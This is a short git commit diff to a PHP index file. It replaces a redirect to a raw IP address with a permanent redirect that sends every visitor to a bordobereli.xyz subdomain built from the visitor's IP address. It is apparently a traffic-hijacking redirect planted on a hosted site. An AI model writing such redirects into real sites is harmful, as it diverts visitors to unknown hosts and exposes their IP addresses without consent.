899b7dfbb136489eff687477ceee725ca15cd058
root <root@hp5078-nzs.host-palace.com>
2023-11-26 13:43:13 +0100

    add

--- index.php
+++ index.php
@@ -1,5 +1,7 @@
 <?php
- $url = "http://88.210.38.11".$_SERVER['REQUEST_URI'];
- header("HTTP/1.1 301 Moved Permanently"); 
- header("Location: $url");
+
+	$hash = ip2long(   $_SERVER['REMOTE_ADDR'] );
+	$url = "http://".$hash.".bordobereli.xyz".$_SERVER['REQUEST_URI'];
+	header("HTTP/1.1 301 Moved Permanently"); 
+	header("Location: $url");
 ?>
